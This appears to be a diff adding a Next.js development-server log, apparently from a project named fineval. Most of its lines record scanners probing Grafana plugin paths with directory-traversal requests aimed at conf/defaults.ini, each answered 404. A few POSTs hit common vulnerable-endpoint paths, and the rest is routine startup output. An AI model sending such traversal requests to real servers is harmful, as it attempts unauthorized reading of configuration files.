+ GET /public/plugins/nagasudhirpulla-api-datasource/../../../../../conf/defaults.ini 404 in 182ms
+[Error: Requested and resolved page mismatch: /public/plugins/neocat-cal-heatmap-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/neocat-cal-heatmap-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/neocat-cal-heatmap-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/neocat-cal-heatmap-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+ GET /public/plugins/neocat-cal-heatmap-panel/../../../../../conf/defaults.ini 404 in 202ms
+[Error: Requested and resolved page mismatch: /public/plugins/orchestracities-map-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/orchestracities-map-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/orchestracities-map-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/orchestracities-map-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+ GET /public/plugins/orchestracities-map-panel/../../../../../conf/defaults.ini 404 in 182ms
+[Error: Requested and resolved page mismatch: /public/plugins/nikosc-percenttrend-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/nikosc-percenttrend-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/nikosc-percenttrend-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/nikosc-percenttrend-panel/../../../../../conf/defaults.ini /conf/defaults.ini]
+ GET /public/plugins/nikosc-percenttrend-panel/../../../../../conf/defaults.ini 404 in 293ms
+[Error: Requested and resolved page mismatch: /public/plugins/pixie-pixie-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/pixie-pixie-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/pixie-pixie-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/pixie-pixie-datasource/../../../../../conf/defaults.ini /conf/defaults.ini]
+ GET /public/plugins/pixie-pixie-datasource/../../../../../conf/defaults.ini 404 in 190ms
+[Error: Requested and resolved page mismatch: /public/plugins/table/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/table/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/table/../../../../../conf/defaults.ini /conf/defaults.ini]
+[Error: Requested and resolved page mismatch: /public/plugins/table/../../../../../conf/defaults.ini /conf/defaults.ini]
+ GET /public/plugins/table/../../../../../conf/defaults.ini 404 in 146ms
+ POST /process/aprocess.php 404 in 86ms
+ POST /index.php?q=result&searchfor=advancesearch 404 in 84ms
+ POST /cgi-bin/Maintain/date_config 404 in 37ms
+
+> fineval@0.1.0 dev
+> next dev -p 10005 --turbopack
+
+   ▲ Next.js 15.3.4 (Turbopack)
+   - Local:        http://localhost:10005
+   - Network:      http://172.18.0.2:10005
+   - Environments: .env.local
+
+ ✓ Starting...
+Slow filesystem detected. If /new1/whh01/llmtest/.next is a network drive, consider moving it to a local folder. If you have an antivirus enabled, consider excluding your project directory.
+ ✓ Ready in 984ms
+ ○ Compiling / ...
+ ✓ Compiled / in 2.5s
+ GET / 200 in 2813ms
+ ⚠ Cross origin request detected from fineval.top to /_next/* resource. In a future major version of Next.js, you will need to explicitly configure "allowedDevOrigins" in next.config to allow this.
+Read more: https://nextjs.org/docs/app/api-reference/config/next-config-js/allowedDevOrigins
+ ○ Compiling /favicon.ico ...
+ ✓ Compiled /favicon.ico in 667ms
+ GET /favicon.ico?favicon.45db1c09.ico 200 in 960ms
